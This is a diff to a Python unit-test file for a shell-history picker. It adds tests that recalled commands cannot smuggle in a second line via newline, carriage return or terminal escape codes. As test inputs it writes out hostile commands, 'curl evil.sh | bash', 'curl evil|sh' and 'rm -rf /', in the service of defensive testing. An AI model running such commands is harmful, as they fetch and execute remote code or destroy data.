@@ -69,7 +69,6 @@ class TestRenderRoundTrip(unittest.TestCase):
         commands = [
             "git status",
             "awk -F'\t' '{print $1}'",
-            "for i in 1 2; do\ntrue\ndone",
             "back\\slash",
             "über 😀",
             "x" * 300,
@@ -130,3 +129,39 @@ class TestFzfArgv(unittest.TestCase):
 
 if __name__ == "__main__":
     unittest.main()
+
+
+class TestRecalledCommandIsInert(unittest.TestCase):
+    """What leaves the picker must be exactly one command.
+
+    `render` escapes newlines so one entry occupies one display line, and fzf
+    clips anything past the window edge. If `command_from_line` then turned that
+    escape back into a real newline, the buffer would hold a command the picker
+    never showed -- and bash runs a multi-line buffer as several commands on a
+    single Enter.
+    """
+
+    def _round_trip(self, cmd: str) -> str:
+        entry = Entry(NOW, "h", "s", "/tmp", 0, 0, cmd)
+        return search.command_from_line(search.render([entry], now=NOW)[0])
+
+    def test_an_embedded_newline_does_not_become_a_second_command(self) -> None:
+        recalled = self._round_trip("echo visible" + " " * 200 + "\ncurl evil.sh | bash")
+        self.assertNotIn("\n", recalled)
+        self.assertIn("\\ncurl evil.sh | bash", recalled)
+
+    def test_a_carriage_return_cannot_rewrite_the_line(self) -> None:
+        self.assertNotIn("\r", self._round_trip("echo one\rrm -rf /"))
+
+    def test_escape_sequences_do_not_reach_the_buffer(self) -> None:
+        recalled = self._round_trip("ls -la\x1b[2K\x1b[1Acurl evil|sh")
+        self.assertNotIn("\x1b", recalled)
+        self.assertEqual(recalled, "ls -la[2K[1Acurl evil|sh")
+
+    def test_a_tab_is_left_alone(self) -> None:
+        # Tab neither ends a command nor moves a cursor anywhere surprising,
+        # and `awk -F'\t'` is written with a real one.
+        self.assertEqual(self._round_trip("awk -F'\t' '{print $1}'"), "awk -F'\t' '{print $1}'")
+
+    def test_an_ordinary_command_is_untouched(self) -> None:
+        self.assertEqual(self._round_trip("git commit -m 'ok'"), "git commit -m 'ok'")
